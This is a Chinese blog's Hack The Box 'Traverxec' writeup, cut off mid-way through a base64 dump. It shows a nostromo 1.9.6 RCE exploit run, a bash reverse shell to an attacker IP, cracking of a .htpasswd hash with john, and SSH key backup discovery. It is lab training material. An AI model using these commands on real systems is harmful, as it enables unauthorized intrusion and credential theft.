@@ -1,0 +1,765 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：nostromo 1.9.6 命令执行漏洞、nhttpd.conf配置文件分析、ssh2john工具转码id_rsa文件、根目录文件分析、journalctl提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Traverxec-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/09/Traverxec-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：nostromo 1.9.6 命令执行漏洞、nhttpd.conf配置文件分析、ssh2john工具转码id_rsa文件、根目录文件分析、journalctl提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Traverxec-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Traverxec-htb-writeup/2.png">
+<meta property="article:published_time" content="2023-12-09T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-09T13:38:54.699Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Traverxec-htb-writeup/1.png">
+  
+  
+  
+  <title>Traverxec-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Traverxec-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-09 23:50" pubdate>
+          2023年12月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          171 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Traverxec-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：nostromo 1.9.6 命令执行漏洞、nhttpd.conf配置文件分析、ssh2john工具转码id_rsa文件、根目录文件分析、journalctl提权</p>
+<span id="more"></span>  
+
+<p>参考链接：官方演练报告</p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取靶机IP地址：10.10.10.165</p>
+<p>2、使用nmap对靶机进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p<span class="hljs-string">&quot;22,80,&quot;</span> <span class="hljs-string">&quot;10.10.10.165&quot;</span><br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 aa:99:a8:16:68:<span class="hljs-built_in">cd</span>:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)<br>|   256 93:<span class="hljs-built_in">dd</span>:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)<br>|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)<br>80/tcp open  http    nostromo 1.9.6<br>|_http-server-header: nostromo 1.9.6<br>|_http-title: TRAVERXEC<br></code></pre></td></tr></table></figure>
+
+<p>3、通过nmap扫描发现了80端口存在模版名称和版本信息，使用百度进行exp的搜索</p>
+<p><img src="http://sh1yan.top/photo/Traverxec-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://github.com/AnubisSec/CVE-2019-16278</code></p>
+<p>4、下载下来使用该exp进行尝试，是否可以利用成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 nostroSploit.py 10.10.10.165 80 <span class="hljs-built_in">id</span>                        <br>[+] Connecting to target<br>[+] Sending malicious payload<br>HTTP/1.1 200 OK<br>Date: Sat, 09 Dec 2023 11:54:15 GMT<br>Server: nostromo 1.9.6<br>Connection: close<br><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<p>5、可以发现是执行成功了，那接下来我们进行获取反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 nostroSploit.py 10.10.10.165 80 <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1&quot;&#x27;</span> <br>[+] Connecting to target<br>[+] Sending malicious payload<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443  <br>listening on [any] 443 ...<br>connect to [10.10.14.7] from (UNKNOWN) [10.10.10.165] 59770<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (548): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@traverxec:/usr/bin$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@traverxec:/usr/bin$<br></code></pre></td></tr></table></figure>
+
+<p>6、到这里获取到初始的权限了，不过在接下来的枚举中，我被这个兔子洞给耽误了一会时间</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@traverxec:/usr/bin$ <span class="hljs-built_in">cd</span> /var/<br><span class="hljs-built_in">cd</span> /var/<br>www-data@traverxec:/var$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backups<br>cache<br>lib<br><span class="hljs-built_in">local</span><br>lock<br><span class="hljs-built_in">log</span><br>mail<br>nostromo<br>opt<br>run<br>spool<br>tmp<br>www-data@traverxec:/var$ <span class="hljs-built_in">cd</span> nostromo<br><span class="hljs-built_in">cd</span> nostromo<br>www-data@traverxec:/var/nostromo$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 24<br>drwxr-xr-x  6 root     root   4096 Oct 25  2019 .<br>drwxr-xr-x 12 root     root   4096 Oct 25  2019 ..<br>drwxr-xr-x  2 root     daemon 4096 Oct 27  2019 conf<br>drwxr-xr-x  6 root     daemon 4096 Oct 25  2019 htdocs<br>drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons<br>drwxr-xr-x  2 www-data daemon 4096 Dec  9 06:44 logs<br>www-data@traverxec:/var/nostromo$ <span class="hljs-built_in">cd</span> conf<br><span class="hljs-built_in">cd</span> conf<br>www-data@traverxec:/var/nostromo/conf$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .<br>drwxr-xr-x 6 root root   4096 Oct 25  2019 ..<br>-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd<br>-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes<br>-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf<br>www-data@traverxec:/var/nostromo/conf$ <span class="hljs-built_in">cat</span> .htpasswd<br><span class="hljs-built_in">cat</span> .htpasswd<br>david:$1$e7NfNpNi<span class="hljs-variable">$A6nCwOTqrNR2oDuIKirRZ</span>/<br>www-data@traverxec:/var/nostromo/conf$<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span> <br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;md5crypt-long&quot;</span><br>Use the <span class="hljs-string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])<br>Will run 3 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>Nowonly4me       (david)     <br>1g 0:00:01:43 DONE (2023-12-09 20:10) 0.009675g/s 102352p/s 102352c/s 102352C/s Noyoudo..November^<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh david@10.10.10.165                                    <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.165 (10.10.10.165)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:AbyOr506Yqq/VclZ900M6Ijj6qCoveykzcpc/cuIB14.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.165<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">david@10.10.10.165&#x27;</span>s password: <br>Permission denied, please try again.<br>david@10.10.10.165<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">david@10.10.10.165: Permission denied (publickey,password).</span><br></code></pre></td></tr></table></figure>
+
+<p>7、到这里意识到这个可能是个假密码，在继续的枚举过程中，并参考了演练报告，发现了目标用户的id_rsa文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@traverxec:/var/nostromo$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 24<br>drwxr-xr-x  6 root     root   4096 Oct 25  2019 .<br>drwxr-xr-x 12 root     root   4096 Oct 25  2019 ..<br>drwxr-xr-x  2 root     daemon 4096 Oct 27  2019 conf<br>drwxr-xr-x  6 root     daemon 4096 Oct 25  2019 htdocs<br>drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons<br>drwxr-xr-x  2 www-data daemon 4096 Dec  9 06:44 logs<br>www-data@traverxec:/var/nostromo$ <span class="hljs-built_in">cd</span> conf<br><span class="hljs-built_in">cd</span> conf<br>www-data@traverxec:/var/nostromo/conf$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .<br>drwxr-xr-x 6 root root   4096 Oct 25  2019 ..<br>-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd<br>-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes<br>-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf<br>www-data@traverxec:/var/nostromo/conf$ <span class="hljs-built_in">cat</span> nhttpd.conf<br><span class="hljs-built_in">cat</span> nhttpd.conf<br><span class="hljs-comment"># MAIN [MANDATORY]</span><br><br>servername      traverxec.htb<br>serverlisten    *<br>serveradmin     david@traverxec.htb<br>serverroot      /var/nostromo<br>servermimes     conf/mimes<br>docroot         /var/nostromo/htdocs<br>docindex        index.html<br><br><span class="hljs-comment"># LOGS [OPTIONAL]</span><br><br>logpid        logs/nhttpd.pid<br><br><span class="hljs-comment"># SETUID [RECOMMENDED]</span><br><br>user   www-data<br><br><span class="hljs-comment"># BASIC AUTHENTICATION [OPTIONAL]</span><br><br>htaccess        .htaccess<br>htpasswd        /var/nostromo/conf/.htpasswd<br><br><span class="hljs-comment"># ALIASES [OPTIONAL]</span><br><br>/icons        /var/nostromo/icons<br><br><span class="hljs-comment"># HOMEDIRS [OPTIONAL]</span><br><br>homedirs        /home<br>homedirs_public   public_www<br>www-data@traverxec:/var/nostromo/conf$ <span class="hljs-built_in">ls</span> -la /home/david/public_www<br><span class="hljs-built_in">ls</span> -la /home/david/public_www<br>total 16<br>drwxr-xr-x 3 david david 4096 Oct 25  2019 .<br>drwx--x--x 5 david david 4096 Oct 25  2019 ..<br>-rw-r--r-- 1 david david  402 Oct 25  2019 index.html<br>drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area<br>www-data@traverxec:/var/nostromo/conf$ <span class="hljs-built_in">cd</span> /home/david/public_www/protected-file-area<br>&lt;conf$ <span class="hljs-built_in">cd</span> /home/david/public_www/protected-file-area<br>www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="hljs-built_in">ls</span>     <br><span class="hljs-built_in">ls</span><br>backup-ssh-identity-files.tgz<br>www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 16<br>drwxr-xr-x 2 david david 4096 Oct 25  2019 .<br>drwxr-xr-x 3 david david 4096 Oct 25  2019 ..<br>-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess<br>-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz<br>www-data@traverxec:/home/david/public_www/protected-file-area$<br><br>www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="hljs-built_in">md5sum</span> backup-ssh-identity-files.tgz<br>&lt;ted-file-area$ <span class="hljs-built_in">md5sum</span> backup-ssh-identity-files.tgz           <br>084883c47fec5b1385b50f226db8175f  backup-ssh-identity-files.tgz<br>www-data@traverxec:/home/david/public_www/protected-file-area$<br><br><br>www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="hljs-built_in">base64</span> backup-ssh-identity-files.tgz -w 0<br>&lt;ile-area$ <span class="hljs-built_in">base64</span> backup-ssh-identity-files.tgz -w 0           <br><br>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